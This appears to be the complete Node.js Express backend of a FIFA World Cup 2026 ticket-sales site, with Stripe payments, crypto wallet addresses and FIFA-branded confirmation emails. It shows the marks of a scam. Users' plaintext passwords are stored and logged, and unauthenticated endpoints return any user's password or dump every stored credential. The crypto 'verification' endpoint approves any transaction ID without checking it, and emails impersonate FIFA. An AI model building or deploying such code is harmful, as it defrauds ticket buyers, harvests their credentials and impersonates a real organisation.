const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

// We use native 'fetch' for Elastic Email, so no 'resend' or 'nodemailer' required here
const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// In-memory storage
const transactions = [];
const userCredentials = [];

// Crypto Config
const CRYPTO_ADDRESSES = {
    'USDT_TRC20': 'TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6',
    'SOL': 'BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd',
    'BTC': 'bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw',
    'ETH': '0x7978f226bbce9f03cac5c6d32526291a776b7436',
    'USDT_ERC20': '0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47'
};

const CRYPTO_NETWORKS = {
    'USDT_TRC20': 'TRC20 Network',
    'SOL': 'SOLANA Network',
    'BTC': 'Bitcoin Network',
    'ETH': 'Ethereum ERC20 Network',
    'USDT_ERC20': 'Ethereum ERC20 Network'
};

function generateTransactionId() {
    return 'FIFA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function validateTransactionId(txnId, cryptoType) {
    return txnId.length > 5;
}

// --- API ENDPOINTS ---

app.get('/', (req, res) => {
    res.json({ status: 'System Running', email_system: 'Elastic Email API' });
});

app.get('/api/stripe-config', (req, res) => {
    res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
});

app.get('/api/crypto-addresses', (req, res) => {
    res.json({
        success: true,
        addresses: CRYPTO_ADDRESSES,
        networks: CRYPTO_NETWORKS
    });
});

// ✅ Credential Storage Logic
app.post('/api/store-credentials', (req, res) => {
    try {
        const { username, password, email, name } = req.body;
        
        console.log('🔐 Storing credentials:', { username, password, email, name });
        
        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
        
        if (existingUserIndex !== -1) {
            userCredentials[existingUserIndex] = { username, password, email, name, timestamp: new Date().toISOString() };
        } else {
            userCredentials.push({ username, password, email, name, timestamp: new Date().toISOString() });
        }
        
        res.json({ success: true, message: 'Credentials stored successfully' });
        
    } catch (error) {
        console.error('❌ Error storing credentials:', error);
        res.json({ success: false, message: error.message });
    }
});

app.get('/api/get-password/:username', (req, res) => {
    try {
        const { username } = req.params;
        const user = userCredentials.find(u => u.username === username);
        
        if (user) {
            res.json({ success: true, ...user });
        } else {
            res.status(404).json({ success: false, message: 'User not found' });
        }
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

app.get('/api/all-users', (req, res) => {
    res.json({ success: true, count: userCredentials.length, users: userCredentials });
});

app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer, tickets } = req.body;
        
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Tickets (${tickets.length})`,
            receipt_email: customer.email
        });

        res.json({
            success: true,
            clientSecret: paymentIntent.client_secret
        });
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/verify-crypto', async (req, res) => {
    const { transactionId } = req.body;
    res.json({ success: true, verified: true, transactionId: transactionId, message: 'Verified' });
});

// ✅ NEW EMAIL SENDING FUNCTION (Using Elastic Email API via fetch)
app.post('/api/send-confirmation', async (req, res) => {
    try {
        const { customer, tickets, payment, transactionId } = req.body;
        
        console.log('📧 Sending email via Elastic Email to:', customer.email);

        // 1. Respond to Frontend immediately (Non-blocking)
        res.json({ success: true, message: 'Confirmation sent' });

        // 2. Generate HTML
        const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);

        // 3. Send via Elastic Email API (Background)
        // This uses standard HTTP, so it CANNOT timeout due to port blocking
        sendEmailViaElastic(customer.email, `Ticket Confirmation #${transactionId}`, emailHtml);

    } catch (error) {
        console.error('Server Error:', error);
        if (!res.headersSent) {
            res.json({ success: true, message: 'Processed' });
        }
    }
});

// Helper: Send via Elastic Email API
async function sendEmailViaElastic(to, subject, html) {
    const apiKey = process.env.ELASTIC_EMAIL_API_KEY;
    const fromEmail = process.env.ELASTIC_EMAIL_FROM; // noreply.fifaticket@gmail.com

    if (!apiKey) {
        console.error("❌ Missing ELASTIC_EMAIL_API_KEY");
        return;
    }

    try {
        // Construct URL parameters
        const params = new URLSearchParams();
        params.append('apikey', apiKey);
        params.append('from', fromEmail);
        params.append('fromName', 'FIFA World Cup 2026');
        params.append('to', to);
        params.append('subject', subject);
        params.append('bodyHtml', html);
        params.append('isTransactional', 'true');

        const response = await fetch('https://api.elasticemail.com/v2/email/send', {
            method: 'POST',
            body: params
        });

        const data = await response.json();
        
        if (data.success === false) {
            console.error('❌ Elastic Email Error:', data.error);
        } else {
            console.log('✅ Elastic Email Sent:', data);
        }
    } catch (err) {
        console.error('❌ API Request Failed:', err);
    }
}

// HTML Generator
function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
    const ticketList = tickets.map(t => {
        const qty = t.quantity || 1;
        const price = t.price || 0;
        const total = price * qty;

        return `
        <div style="border: 1px solid #e0e0e0; border-radius: 8px; margin-bottom: 15px; overflow: hidden;">
            <div style="background-color: #1a1a2e; color: white; padding: 10px 15px; font-size: 16px; font-weight: bold;">
                🎫 ${t.match.teams}
            </div>
            <div style="padding: 15px; background-color: #ffffff;">
                <p style="margin: 5px 0; color: #666;"><strong>Date:</strong> ${t.match.date}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Venue:</strong> ${t.match.venue}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Category:</strong> ${t.category.name}</p>
                <div style="margin-top: 10px; border-top: 1px solid #eee; padding-top: 10px;">
                    <p style="margin: 0;"><strong>Quantity:</strong> ${qty}</p>
                    <p style="margin: 0; font-size: 1.1em; color: #1a1a1a;"><strong>Price:</strong> USD ${total.toLocaleString()}</p>
                </div>
            </div>
        </div>`;
    }).join('');

    return `
    <!DOCTYPE html>
    <html>
    <body style="font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0;">
        <div style="max-width: 600px; margin: 0 auto; background: #ffffff;">
            <div style="background-color: #1a1a2e; color: #ffffff; padding: 30px 20px; text-align: center;">
                <div style="font-size: 24px; font-weight: bold; margin-bottom: 10px;">🎉 FIFA World Cup 2026™</div>
                <div style="font-size: 18px; opacity: 0.9;">Your Ticket Purchase Confirmation</div>
            </div>
            <div style="padding: 30px 20px;">
                <p>Dear <strong>${customer.name}</strong>,</p>
                <p>Thank you for your purchase! Your tickets have been confirmed.</p>
                <h3 style="border-bottom: 2px solid #1a1a2e; padding-bottom: 10px; margin-top: 30px;">📋 Order Summary</h3>
                ${ticketList}
                <div style="background-color: #1a1a2e; color: white; padding: 20px; border-radius: 8px; margin-top: 30px;">
                    <h3 style="margin-top: 0; margin-bottom: 15px;">💰 Payment Details</h3>
                    <p style="margin: 5px 0; opacity: 0.9;">Payment Method: <strong>${paymentMethod === 'card' ? 'Credit/Debit Card' : payment.cryptoType}</strong></p>
                    <p style="margin: 5px 0; opacity: 0.9;">Transaction ID: <span style="font-family: monospace;">${transactionId}</span></p>
                    <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.2); margin: 15px 0;">
                    <p style="margin: 0; font-size: 18px; font-weight: bold;">Total Paid: USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
                </div>
            </div>
        </div>
    </body>
    </html>`;
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
